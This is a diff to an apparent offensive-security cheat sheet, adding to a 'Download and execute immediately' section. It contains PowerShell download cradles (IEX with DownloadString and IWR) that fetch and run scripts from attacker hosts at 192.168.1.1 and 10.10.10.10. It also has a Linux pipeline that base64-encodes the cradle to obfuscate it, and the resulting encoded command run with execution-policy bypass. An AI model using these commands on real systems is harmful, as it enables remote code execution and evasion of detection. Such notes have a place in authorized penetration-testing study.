@@ -43,7 +43,18 @@ Download and execute immediately
 http://192.168.1.1/file.exe')
 > powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('
 http://192.168.1.1/file.exe')
+
+or this one (newer):
+> powershell.exe -c 'IEX(IWR http://10.10.10.10/file.ps1 -UseBasicParsing)'
+
+base64 encoding to avoid badchars or to obfuscate:
+in linux:
+> echo "powershell.exe -c 'IEX(IWR http://10.10.10.10/file.ps1 -UseBasicParsing)'" | iconv -f ASCII -t UTF-16LE | base64 | tr -d "\n"
+result = a base64 blob.
+Then run on attacker machine:
+> powershell.exe -nop -exec bypass -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjACAAJwBJAEUAWAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBmAGkAbABlAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkAJwAKAA==
 ```
+
 
 ###### impacket-smbserver
 ```
